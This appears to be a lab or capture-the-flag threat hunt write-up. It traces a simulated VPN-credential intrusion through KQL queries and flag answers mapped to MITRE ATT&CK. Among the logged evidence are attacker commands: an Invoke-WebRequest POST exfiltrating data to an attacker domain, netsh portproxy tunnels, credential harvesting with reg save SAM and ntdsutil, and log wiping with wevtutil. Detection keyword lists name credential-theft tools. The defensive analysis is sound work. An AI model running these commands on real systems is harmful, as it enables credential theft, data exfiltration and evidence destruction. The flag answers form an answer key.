# Operation Silent Corridor – Threat Hunt Report

Aligned with NIST SP 800-61 and mapped to the MITRE ATT&CK Framework

---

# Executive Summary

The Hunt 04 investigation identified a successful multi-stage intrusion targeting the Engineering network through compromised VPN credentials associated with the accounts `s.brandt` and `m.richter`. The attacker initially gained access through the FortiGate VPN infrastructure using anonymized infrastructure and residential IP addresses before establishing a foothold on `WS-ENG04`.

Following initial access, the threat actor conducted internal reconnaissance, credential access activities, lateral movement to `SRV-DC01` and `SRV-FILES02`, and ultimately staged and exfiltrated sensitive data. Targeted assets included the Active Directory database (`ntds.dit`) and classified engineering data located in `C:\Engineering\Avionics\A400M_NavSys`.

The adversary established persistence through `netsh interface portproxy` configurations stored in the registry under:

`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

The actor also attempted anti-forensic cleanup by clearing Windows event logs and deleting staging artifacts. However, Sysmon telemetry remained intact and enabled reconstruction of attacker activity.

---

# Incident Classification (NIST SP 800-61)

| Category          | Classification                                        |
| ----------------- | ----------------------------------------------------- |
| Incident Type     | Unauthorized Access / Data Exfiltration               |
| Severity          | High                                                  |
| Impact            | Active Directory compromise and classified data theft |
| Affected Systems  | WS-ENG04, SRV-DC01, SRV-FILES02                       |
| Affected Accounts | s.brandt, m.richter                                   |
| Initial Vector    | Compromised VPN credentials                           |
| Data Exposure     | Active Directory database and engineering files       |

---

# MITRE ATT&CK Techniques Observed

| Tactic            | Technique ID | Technique                          |
| ----------------- | ------------ | ---------------------------------- |
| Initial Access    | T1133        | External Remote Services           |
| Initial Access    | T1078        | Valid Accounts                     |
| Discovery         | T1082        | System Information Discovery       |
| Discovery         | T1069.002    | Domain Groups Discovery            |
| Discovery         | T1018        | Remote System Discovery            |
| Credential Access | T1003.001    | LSASS Memory                       |
| Credential Access | T1003.002    | SAM                                |
| Credential Access | T1555        | Credentials from Password Stores   |
| Lateral Movement  | T1047        | Windows Management Instrumentation |
| Persistence       | T1112        | Modify Registry                    |
| Persistence       | T1090        | Proxy                              |
| Collection        | T1560        | Archive Collected Data             |
| Collection        | T1003.003    | NTDS                               |
| Exfiltration      | T1041        | Exfiltration Over C2 Channel       |
| Defense Evasion   | T1070.001    | Clear Windows Event Logs           |
| Defense Evasion   | T1070.004    | File Deletion                      |

---

# Threat Hunt Findings

---

# Flag 0 – Log Source Identification

## Hunt Lead

"The advisory says previous victims were compromised through remote access infrastructure. Profile every account. Find the one that doesn't fit."

## Query Used

```kql
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| summarize count() by MdeTable
```

## Investigation

The investigation identified the custom log source `SilentCorridorX_CL` as the primary telemetry table used throughout the hunt.

## Answer

`SilentCorridorX_CL`

---

# Flag 1 – Suspicious VPN Account Activity

## Hunt Lead

"The advisory says previous victims were compromised through remote access infrastructure. Profile every account. Find the one that doesn't fit."

Format: username

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| distinct RemoteIP
```

## Investigation

The investigation reviewed VPN authentication activity for all users and identified abnormal remote access patterns associated with the account `s.brandt`. The account authenticated from four separate IP addresses, including anonymization infrastructure and residential IP space.

Observed IPs:

<img width="142" height="161" alt="image" src="https://github.com/user-attachments/assets/75e39492-d6a4-4c49-a454-516bf68f7902" />

The multiple geographically inconsistent VPN connections strongly suggested compromised credentials and unauthorized remote access.

## MITRE ATT&CK Mapping

* T1133 – External Remote Services
* T1078 – Valid Accounts

## Answer

`s.brandt`

---

# Flag 2 – Origin of Failed Authentication

## Hunt Lead

"Could be a busy employee. Could be someone else using their credentials. Prove it one way or the other."

Format: IPv4 address

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where isnotempty(EventTime)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| distinct ActionType
```

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where isnotempty(EventTime)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| where ActionType == "ssl-login-fail"
| project EventTime, AccountName, RemoteIP, ActionType, TunnelIP, DestinationHost
| order by EventTime asc
```

## Investigation

The investigation identified the first failed VPN authentication attempt associated with `s.brandt`. The earliest failed authentication originated from IP address `185.220.101.34`, a known Tor exit node.

This activity strongly indicated credential abuse rather than legitimate user behavior.

## MITRE ATT&CK Mapping

* T1090 – Proxy
* T1078 – Valid Accounts

## Answer

`185.220.101.34`

---

# Flag 3 – Connection Footprint

## Hunt Lead

"That IP failed then succeeded. Scope the full picture for this account across the window."

Format: Number only

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName == "s.brandt"
| summarize Tables = make_set(MdeTable) by DeviceName
| sort by DeviceName asc
| count
```

## Investigation

The investigation identified that the compromised account `s.brandt` interacted with four distinct hosts during the attack window.

This confirmed that the account was used for multi-host reconnaissance and lateral movement activity.

## MITRE ATT&CK Mapping

* T1021 – Remote Services
* T1018 – Remote System Discovery

## Answer

`4`

---

# Flag 4 – Source Address Inventory

## Hunt Lead

"Need them for threat intel. Pull every distinct source for this account."

Format: Comma-separated, sorted by first octet ascending

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| distinct RemoteIP
```

## Investigation

The investigation enumerated all distinct VPN source IP addresses associated with the compromised account `s.brandt`.

Three addresses were associated with anonymization infrastructure, while one originated from residential IP space.

## MITRE ATT&CK Mapping

* T1090 – Proxy
* T1133 – External Remote Services

## Answer

`45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34`

---

# Flag 5 – Initial Landing Host

## Hunt Lead

"Threat intel confirms three of those are anonymization infrastructure. The fourth is residential. Where did the attacker actually land?"

Format: Short hostname

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| where RemoteIP == "91.234.33.126"
| project EventTime, RemoteIP, ActionType, DestinationHost, TunnelIP
| sort by EventTime asc
```

## Investigation

The residential IP `91.234.33.126` consistently authenticated to `WS-ENG04`, identifying it as the initial foothold established inside the Engineering network.

## MITRE ATT&CK Mapping

* T1133 – External Remote Services
* T1078 – Valid Accounts

## Answer

`WS-ENG04`

---

# Flag 6 – Initial Process Execution

## Hunt Lead

"Pivot to the beachhead. What's the first non-routine process under their session, and what spawned it?"

Format: PROCESS/PARENT

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

Immediately following VPN access, the attacker executed `systeminfo.exe` through `cmd.exe` on `WS-ENG04`.

This activity represented initial host reconnaissance and confirmed interactive attacker presence.

## MITRE ATT&CK Mapping

* T1082 – System Information Discovery

## Answer

`systeminfo.exe/cmd.exe`

---

# Flag 7 – Directory Enumeration

## Hunt Lead

"What did they go after first? If they're mapping the environment, I need to know what they found."

Format: In order of execution, comma-separated

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "WS-ENG04"
| where FileName in ("net.exe", "net1.exe", "WMIC.exe")
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

## Investigation

The attacker enumerated privileged Active Directory groups including `Domain Admins` and `Enterprise Admins` using built-in Windows administrative utilities.

This confirmed privilege escalation reconnaissance and targeting of high-value administrative accounts.

## MITRE ATT&CK Mapping

* T1069.002 – Domain Groups Discovery

## Answer

`Domain Admins, Enterprise Admins`

---

# Flag 8 – Network Reconnaissance

## Hunt Lead

"They know who the admins are. What infrastructure did they map next?"

Format: Hostnames, comma-separated, alphabetical

## Query Used

```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceEvents"
| where DeviceName == "WS-ENG04"
| where ActionType == "DnsQueryResponse"
| project EventTime, DnsQueryString, DnsQueryResult, FileName
| sort by EventTime asc
```

## Investigation

The attacker performed DNS reconnaissance and identified key infrastructure hosts within the environment:

* SRV-DC01
* SRV-FILES02

This activity indicated preparation for lateral movement and sensitive data targeting.

## MITRE ATT&CK Mapping

* T1018 – Remote System Discovery
* T1046 – Network Service Discovery

## Answer

`SRV-DC01, SRV-FILES02`

---

# Flag 9 – First Credential Activity

## Hunt Lead

"Parallel track. That VPN account alone isn't getting them to those servers. They need more. Find the earliest evidence on the beachhead."

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL;
HuntData
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("mimikatz", "sekurlsa", "lsass", "procdump", "comsvcs", "MiniDump", "cmdkey", "vaultcmd", "reg save", "sekurlsa:logonpasswords", "token", "psexec", "creds")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

The attacker executed:

`tasklist /fi "imagename eq lsass.exe"`

This activity confirmed reconnaissance targeting `lsass.exe` prior to credential dumping attempts.

## MITRE ATT&CK Mapping

* T1003.001 – LSASS Memory

## Answer

`tasklist /fi "imagename eq lsass.exe"`

---

# Flag 10 – Credential Dump Outcome

## Hunt Lead

"What happened next in the timeline? Did they get what they wanted?"

Format: YES_OR_NO/INTERVENING_PROCESS_OR_NONE

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceFileEvents"
| where todatetime(EventTime) between (datetime(2026-02-26T02:00:00) .. datetime(2026-02-26T06:00:00))
| project EventTime, FileName, FolderPath, ActionType
| sort by EventTime asc
```

## Investigation

The attacker attempted to dump LSASS memory using `rundll32.exe comsvcs.dll MiniDump`; however, no dump file was created.

No defensive process intervened, but the dump operation failed to complete successfully.

## MITRE ATT&CK Mapping

* T1003.001 – LSASS Memory

## Answer

`NO/none`

---

# Flag 11 – Stored Credential Source

## Hunt Lead

"Memory wasn't their only target. What else did they go after on this host?"

Format: Hive name only

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where FileName == "reg.exe"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
```

## Investigation

Following the failed LSASS dump attempt, the attacker pivoted to registry hive extraction using:

`reg save HKLM\SAM`

This activity targeted locally stored Windows credentials.

## MITRE ATT&CK Mapping

* T1003.002 – SAM

## Answer

`SAM`

---

# Flag 12 – Saved Credentials Enumeration

## Hunt Lead

"Keep going. Anything else related to stored credentials on this box?"

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "WS-ENG04"
| where ProcessCommandLine has_any ("cmdkey", "vaultcmd", "credential", "cred", "vault", "wincred", "dpapi", "credman")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

The attacker executed:

`cmdkey /list`

This command enumerated credentials stored within Windows Credential Manager and likely exposed saved RDP and network authentication credentials.

## MITRE ATT&CK Mapping

* T1555 – Credentials from Password Stores

## Answer

`cmdkey /list`

---

# Flag 13 – First Lateral Pivot

## Hunt Lead

"They have credentials. They have targets. Reconstruct the first pivot."

Format: TUNNEL_IP/HOST/USER

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where ActionType in ("tunnel-up", "tunnel-down")
| where todatetime(EventTime) between (datetime(2026-02-25T00:00:00Z) .. datetime(2026-02-28T04:00:00Z))
| project EventTime, AccountName, TunnelIP, ActionType
| sort by TunnelIP asc, EventTime asc
```

## Investigation

The attacker leveraged stolen credentials to remotely access `SRV-DC01` using account `m.richter` over tunnel `10.1.96.114`.

The lateral movement activity originated from `WS-ENG04` using WMIC remote execution.

## MITRE ATT&CK Mapping

* T1047 – Windows Management Instrumentation
* T1078 – Valid Accounts

## Answer

`10.1.96.114/SRV-DC01/m.richter`

---

# Flag 14 – New Account Observed

## Hunt Lead

"Different account in that command. That confirms the credential theft worked. Who?"

Format: username

## Investigation

The attacker used the compromised account `m.richter` during WMIC-based lateral movement toward `SRV-DC01`.

## MITRE ATT&CK Mapping

* T1078 – Valid Accounts

## Answer

`m.richter`

---

# Flag 15 – Cross-Host Spawning

## Hunt Lead

"Pivot to the target. Are there commands running on it that shouldn't be? How are they getting there?"

Format: Tool name

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "SRV-DC01"
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by todatetime(EventTime) asc
```

## Investigation

The attacker utilized `WMIC.exe` to remotely spawn processes on `SRV-DC01`.

Process execution was observed through `WmiPrvSE.exe`, confirming remote WMI-based command execution.

## MITRE ATT&CK Mapping

* T1047 – Windows Management Instrumentation

## Answer

`WMIC.exe`

---

# Flag 16 – New Filesystem Activity

## Hunt Lead

"Check the target host directly. Anything new on the filesystem that wasn't there before? What's the full path?"

Format: Full directory path

## Query Used

```kql
SilentCorridorX_CL
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where ActionType == "FileCreated"
| where todatetime(EventTime) > datetime(2026-02-28T04:17:30Z)
| where todatetime(EventTime) < datetime(2026-02-28T05:00:00Z)
| project EventTime, FileName, FolderPath, InitiatingProcessCommandLine
| sort by todatetime(EventTime) asc
```

## Investigation

The attacker created the staging directory:

`C:\Windows\Temp\McAfee_Logs`

The naming convention masqueraded as legitimate antivirus logs and was used to stage Active Directory database artifacts.

## MITRE ATT&CK Mapping

* T1036 – Masquerading
* T1074 – Data Staged

## Answer

`C:\Windows\Temp\McAfee_Logs`

---

# Flag 17 – Critical File Accessed

## Hunt Lead

"We don't use that product. That's not ours. What was packaged into that staging directory, and which account is responsible?"

Format: FILENAME/USER

## Investigation

The attacker used `ntdsutil.exe` under account `m.richter` to create an IFM set containing `ntds.dit`.

This activity enabled offline extraction of Active Directory credentials.

## MITRE ATT&CK Mapping

* T1003.003 – NTDS

## Answer

`ntds.dit/m.richter`

---

# Flag 18 – Concurrent File Access

## Hunt Lead

"Check the file events around the same moment those files appeared. Did anything else interact with them?"

Format: Process name

## Query Used

```kql
SilentCorridorX_CL
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where FolderPath has "McAfee_Logs"
| where todatetime(EventTime) between (datetime(2026-02-28T04:18:00Z) .. datetime(2026-02-28T04:25:00Z))
| project EventTime, FileName, InitiatingProcessFileName, ActionType
| where InitiatingProcessFileName != "ntdsutil.exe"
```

## Investigation

Microsoft Defender (`MsMpEng.exe`) interacted with the staged files during real-time scanning operations.

Although the activity was detected, no preventive action stopped the staging process.

## MITRE ATT&CK Mapping

* T1003.003 – NTDS

## Answer

`MsMpEng.exe`

---

# Flag 19 – Database File Access Method

## Hunt Lead

"The file they took is locked by the OS while the service runs. How did they get a copy out?"

Format: Tool name only

## Query Used

```kql
SilentCorridorX_CL
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("ntdsutil", "create full", "ifm")
| where todatetime(EventTime) between (datetime(2026-02-28T04:18:00Z) .. datetime(2026-02-28T04:25:00Z))
| project EventTime, AccountName, FileName, FolderPath, ProcessCommandLine
| sort by EventTime desc
```

## Investigation

The attacker used `ntdsutil` to generate an Install From Media (IFM) set while Active Directory services remained online.

This allowed extraction of the `ntds.dit` database without shutting down domain services.

## MITRE ATT&CK Mapping

* T1003.003 – NTDS

## Answer

`ntdsutil`

---

# Flag 20 – Spawning Source

## Hunt Lead

"The commands on that host weren't run by anyone at the console. Something is spawning them, and the trigger is coming from somewhere else."

Format: PARENT/SOURCE_HOST

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "SRV-DC01"
| where EventTime startswith "2026-02-28"
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

Commands executed on `SRV-DC01` were remotely spawned through `WmiPrvSE.exe` originating from `WS-ENG04`.

This confirmed remote WMI-based lateral movement.

## MITRE ATT&CK Mapping

* T1047 – Windows Management Instrumentation

## Answer

`WmiPrvSE.exe/WS-ENG04`

---

# Flag 21 – RDP Scope

## Hunt Lead

"That command wasn't their only way in. Pull the full picture from the attacker's tunnel. Which hosts did they reach via that tunnel?"

Format: Hostnames, comma-separated, alphabetical

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteIP == "10.1.96.114"
| project EventTime, DeviceName, AccountName, RemoteIP, LogonType, ActionType
| sort by EventTime asc
```

## Investigation

The VPN tunnel `10.1.96.114` was used to access:

* SRV-DC01
* SRV-FILES02
* WS-ENG04

This demonstrated the tunnel's role as the primary access channel throughout the intrusion.

## MITRE ATT&CK Mapping

* T1021 – Remote Services

## Answer

`SRV-DC01, SRV-FILES02, WS-ENG04`

---

# Flag 22 – Network Configuration Change

## Hunt Lead

"Check the beachhead for network configuration changes that shouldn't be there."

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "WS-ENG04"
| where FileName has_any ("netsh", "route", "ipconfig", "netcfg", "reg")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

The attacker configured a port proxy on `WS-ENG04` using:

`netsh interface portproxy add v4tov4`

The rule redirected traffic from port `8443` to SMB port `445` on `SRV-DC01.haldric.local`.

This enabled covert network tunneling and persistent access.

## MITRE ATT&CK Mapping

* T1090 – Proxy
* T1572 – Protocol Tunneling

## Answer

`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local`

---

# Flag 23 – Configuration Storage

## Hunt Lead

"Does that change survive a reboot? Where is it stored?"

Format: Full registry key path

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceRegistryEvents"
| where DeviceName has "WS-ENG04"
| where RegistryKey has_any ("portproxy", "PortProxy", "v4tov4", "8443")
| project EventTime, AccountName, RegistryKey, RegistryValueData, ActionType
| sort by EventTime asc
```

## Investigation

The port proxy configuration persisted through the registry key:

`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

This persistence mechanism survives system reboots.

## MITRE ATT&CK Mapping

* T1112 – Modify Registry

## Answer

`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

---

# Flag 24 – Matching Configuration on DC

## Hunt Lead

"Check the other compromised hosts for the same kind of change."

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has_any ("SRV-DC01", "SRV-FILES02")
| where FileName has "netsh"
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

A second port proxy rule was identified on `SRV-DC01`, creating bidirectional tunneling between `WS-ENG04` and the domain controller.

## MITRE ATT&CK Mapping

* T1090 – Proxy
* T1572 – Protocol Tunneling

## Answer

`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp`

---

# Flag 25 – Targeted Directory

## Hunt Lead

"Persistence confirmed. Now the worst question. What directory on the file server did they go after?"

Format: Full directory path

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "SRV-FILES02"
| where ProcessCommandLine has_any ("zip", "rar", "7z", "compress", "archive", "tar", "cab", "winzip", "compact")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

## Investigation

The attacker targeted:

`C:\Engineering\Avionics\A400M_NavSys`

The directory contents were archived and prepared for exfiltration.

## MITRE ATT&CK Mapping

* T1005 – Data from Local System
* T1560 – Archive Collected Data

## Answer

`C:\Engineering\Avionics\A400M_NavSys`

---

# Flag 26 – Packaged Output

## Hunt Lead

"That's classified material. What did they package it as?"

Format: Filename with extension

## Investigation

The attacker disguised the archive as a Windows update package.

## MITRE ATT&CK Mapping

* T1036 – Masquerading

## Answer

`win_update_kb5034.zip`

---

# Flag 27 – Compression Method

## Hunt Lead

"How was it created?"

Format: Cmdlet name

## Investigation

The attacker used the PowerShell cmdlet:

`Compress-Archive`

This cmdlet compressed the targeted engineering files into an archive prior to exfiltration.

## MITRE ATT&CK Mapping

* T1560 – Archive Collected Data

## Answer

`Compress-Archive`

---

# Flag 28 – Encoding Utility

## Investigation

The attacker used `certutil.exe -encode` to Base64-encode the archive prior to exfiltration.

This allowed the archive to bypass content inspection mechanisms by transforming binary data into text format.

## MITRE ATT&CK Mapping

* T1027 – Obfuscated/Compressed Files

## Answer

`certutil.exe`

---

# Flag 29 – Outbound Transfer

## Hunt Lead

"Find the command that sent data out. It may not be on the host you expect."

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("curl", "wget", "Invoke-WebRequest", "WebClient", "UploadFile", "ftp", "scp", "bitsadmin", "certutil", "nc ", "ncat", "powershell")
| where ProcessCommandLine has_any ("upload", "post", "PUT", "send", "transfer", "b64", "kb5034", "nav_cache")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

## Investigation

The attacker exfiltrated data using PowerShell `Invoke-WebRequest` through an HTTP POST request.

The encoded archive was transferred from `WS-ENG04` to an external attacker-controlled domain.

## MITRE ATT&CK Mapping

* T1041 – Exfiltration Over C2 Channel

## Answer

`powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`

---

# Flag 30 – External Destination

## Hunt Lead

"Where did it go?"

Format: Domain name

## Investigation

The encoded archive was exfiltrated to:

`cdn-telemetry.cloud-endpoint.net`

The domain was intentionally named to resemble legitimate telemetry infrastructure.

## MITRE ATT&CK Mapping

* T1041 – Exfiltration Over C2 Channel

## Answer

`cdn-telemetry.cloud-endpoint.net`

---

# Flag 31 – Reentry Window

## Hunt Lead

"There's activity from the same account on the beachhead after the exfil date. They came back. How long did they wait?"

Format: Whole number of days

## Investigation

The attacker resumed activity approximately two days after the initial exfiltration event.

This delay likely represented an attempt to evade time-based detection mechanisms.

## MITRE ATT&CK Mapping

* T1078 – Valid Accounts

## Answer

`2`

---

# Flag 32 – First Cleanup Action

## Hunt Lead

"Last phase. They came back to clean up. Check all three hosts. What did they target first?"

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has_any ("WS-ENG04", "SRV-DC01", "SRV-FILES02")
| where ProcessCommandLine has_any ("del", "wevtutil", "clear-eventlog", "Remove-Item", "cipher", "sdelete", "cleanmgr", "vssadmin delete")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

## Investigation

The attacker executed:

`wevtutil cl Security`

This command cleared Windows Security event logs on compromised systems as part of anti-forensic cleanup activity.

## MITRE ATT&CK Mapping

* T1070.001 – Clear Windows Event Logs

## Answer

`wevtutil cl Security`

---

# Flag 33 – Cleanup Propagation

## Investigation

The attacker leveraged `WS-ENG04` to remotely execute log clearing activity against:

* SRV-DC01
* SRV-FILES02

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where FileName == "wevtutil.exe"
| summarize Parent=any(InitiatingProcessFileName) by DeviceName
```

## MITRE ATT&CK Mapping

* T1070.001 – Clear Windows Event Logs
* T1047 – Windows Management Instrumentation

## Answer

`WS-ENG04/SRV-DC01, SRV-FILES02`

---

# Flag 34 – Surviving Log Source

## Hunt Lead

"They wiped logs on every host we've investigated. And yet we're still here. Why? What did they miss?"

Format: Log source name

## Investigation

Sysmon logging remained intact despite clearing of Windows Security logs.

Specifically, the attacker failed to clear the `Microsoft-Windows-Sysmon/Operational` channel, which preserved process creation telemetry.

## MITRE ATT&CK Mapping

* T1070.001 – Clear Windows Event Logs

## Answer

`Sysmon`

---

# Flag 35 – Exfiltration Confidence Assessment

## Hunt Lead

"Before we close, give me your confidence call on the data theft."

Format: HIGH/MEDIUM/LOW followed by supporting evidence

## Investigation

Evidence confirmed successful exfiltration of sensitive data through multiple correlated telemetry sources.

The archive containing stolen data was compressed, Base64 encoded, staged on the beachhead, and transferred to an external domain using PowerShell.

## MITRE ATT&CK Mapping

* T1041 – Exfiltration Over C2 Channel
* T1560 – Archive Collected Data

## Answer

`HIGH. ntds.dit was encoded as win_update_kb5034.b64, staged on a beachhead, and POSTed to cdn-telemetry.cloud-endpoint.net via PowerShell by s.brandt.`

---

# Flag 36 – DC Staging Cleanup

## Hunt Lead

"Logs weren't the only cleanup. Check SRV-DC01 for staging artifact removal."

Format: Full command as logged

## Query Used

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine has_any ("rd", "rmdir")
| where ProcessCommandLine has "/s"
| project EventTime, DeviceName, AccountName, ProcessCommandLine
| sort by EventTime asc
```

## Investigation

The attacker deleted the staging directory using:

`cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`

This activity removed staged Active Directory database artifacts from `SRV-DC01`.

## MITRE ATT&CK Mapping

* T1070.004 – File Deletion

## Answer

`cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`

---

# Flag 37 – Executive CISO Brief

## Hunt Lead

"Hunt's over. Hofmann needs your findings before the board meeting."

Format: 4-6 sentences

## Investigation

The investigation confirmed compromise of both `s.brandt` and `m.richter` accounts. The attacker established footholds on `WS-ENG04`, later pivoting to `SRV-DC01` and `SRV-FILES02` using WMIC-based lateral movement. Sensitive assets targeted included the `ntds.dit` Active Directory database and classified engineering files stored within `C:\Engineering\Avionics\A400M_NavSys`. Data was compressed, encoded, and exfiltrated through PowerShell `Invoke-WebRequest` to `cdn-telemetry.cloud-endpoint.net`. Persistence was maintained through `netsh interface portproxy` configurations stored under `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`. Immediate containment actions include isolating compromised systems, resetting all potentially exposed credentials, and removing unauthorized port proxy configurations.

## MITRE ATT&CK Mapping

* T1133 – External Remote Services
* T1047 – Windows Management Instrumentation
* T1041 – Exfiltration Over C2 Channel
* T1112 – Modify Registry

## Answer

`The Hunt 04 investigation confirmed that the attacker compromised the user accounts m.richter and s.brandt to facilitate lateral movement. The threat actor pivoted across three primary hosts—SRV-DC01, WS-ENG04, and SRV-FILES02—to target the ntds.dit database and the C:\Engineering\Avionics\A400M_NavSys directory. Data exfiltration was executed via PowerShell Invoke-WebRequest to a cloud endpoint using the file C:\Windows\Temp\win_update_kb5034.b64. Persistence was maintained through a netsh port proxy rule located in the HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp registry key, allowing the connection to survive reboots. Immediate containment requires isolating SRV-DC01 and WS-ENG04, along with removal of the unauthorized registry configurations.`

---

# Containment Recommendations

1. Immediately isolate:

   * WS-ENG04
   * SRV-DC01
   * SRV-FILES02

2. Disable and reset credentials for:

   * s.brandt
   * m.richter

3. Force enterprise-wide Active Directory password resets due to `ntds.dit` exposure.

4. Remove all unauthorized `netsh interface portproxy` configurations.

5. Block outbound communication to:

   * `cdn-telemetry.cloud-endpoint.net`

6. Review VPN authentication policies and enable anomaly detection for geographic IP inconsistencies.

7. Enable enhanced detections for:

   * `ntdsutil.exe`
   * `certutil.exe`
   * `wevtutil.exe`
   * `cmdkey.exe`
   * `netsh interface portproxy`
   * WMIC remote execution
